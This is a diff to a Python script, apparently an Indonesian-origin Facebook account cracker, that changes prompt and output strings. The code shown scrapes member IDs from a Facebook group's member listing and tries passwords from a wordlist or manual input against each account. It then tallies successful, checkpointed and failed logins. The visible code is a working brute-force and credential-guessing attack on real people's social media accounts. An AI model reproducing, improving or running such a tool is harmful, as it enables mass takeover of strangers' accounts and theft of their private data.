@@ -89,7 +89,7 @@ def simpan():
 		except:
 			tampil('\rm[!]Failed to save')
 def buka(d):
-	tampil('\rh[*]Loading friends ids \rp'+d)
+	tampil('\rh[*]Loading ids \rp'+d)
 	try:
 		x = br.open(d)
 		br._factory.is_html = True
@@ -140,7 +140,7 @@ def saring_id_group1(d):
 def saring_id_group0():
 	global id_group
 	while 1:
-		id_group = inputD('[?]group id')
+		id_group = inputD('[?]group id >>Ex>> 48857552164134')
 		tampil('\rh[*]Check the group....')
 		a = buka('https://m.facebook.com/browse/group/members/?id='+id_group+'&amp;start=0&amp;listType=list_nonfriend&amp;refid=18&amp;_rdc=1&amp;_rdr')
 		nama = ' '.join(re.findall(r'<title>(.*?)</title>',a)[0].split()[1:])
@@ -224,17 +224,17 @@ class mt(threading.Thread):
         else:
             self.a = 0
 def crack(d):
-	i = inputD('[?]use Passwordlist/Manual (p/m)',['P','M'])
+	i = inputD('[?]Passwordlist/Manual (p/m)',['P','M'])
 	if i.upper() == 'P':
 		while 1:
-			dir = inputD('[?]Enter file path')
+			dir = inputD('[?]passwrdfile path >>Ex>> /sdcard/file.txt')
 			try:
 				D = open(dir,'r').readlines()
 			except:
-                                tampil('\rm[!]Enter file path%s'%dir)
+                                tampil('\rm[!]passwrdfile path >>Ex>> /sdcard/file.txt%s'%dir)
 				continue
 			break
-		tampil('\rh[*]start crack with \rk%d password'%len(D))
+		tampil('\rh[*]start crack with password'%len(D))
 		for i in D:
 			i = i.replace('\n','')
 			if len(i) != 0:
@@ -293,10 +293,10 @@ def crack0(data,sandi,p):
 		tampil('\rh[*]Daftar akun sukses')
 		for i in akun_sukses:
 			tampil('\rh==>\rk%s \rm[\rp%s\rm]'%(i,sandi))
-	tampil('\rh[*]nmbr of free accounts\rp     %d'%len(akun_sukses))
+	tampil('\rh[*]nmbr of suces acounts\rp     %d'%len(akun_sukses))
 	tampil('\rm[*]nmbr of free accounts\rp     %d'%len(akun_gagal))
-	tampil('\rk[*]nmbr of chkpoint accounts\   %d'%len(akun_cekpoint))
-	tampil('\rc[*]Jumlah akun error\rp         %d'%len(akun_error))
+	tampil('\rk[*]nmbr of chkpoint accounts    %d'%len(akun_cekpoint))
+	tampil('\rc[*]Nmbr of failded acounts\rp   %d'%len(akun_error))
 	if p:
 		i = inputD('[?]Result is wrong want try again (y/n)',['Y','N'])
 		if i.upper() == 'Y':
